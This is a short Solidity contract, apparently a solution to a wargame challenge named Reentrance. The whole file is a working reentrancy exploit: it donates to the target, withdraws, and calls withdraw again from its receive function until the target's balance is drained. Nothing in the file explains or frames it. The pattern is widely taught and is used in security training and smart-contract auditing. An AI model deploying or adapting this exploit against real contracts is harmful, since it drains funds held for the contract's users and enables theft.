// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() external payable {
        IReentrance(target).donate{value: msg.value}(address(this));
        uint256 balance = IReentrance(target).balanceOf(address(this));
        IReentrance(target).withdraw(balance);
    }

    receive() external payable {
        if (target.balance >= msg.value) {
            IReentrance(target).withdraw(msg.value);
        }
    }
}
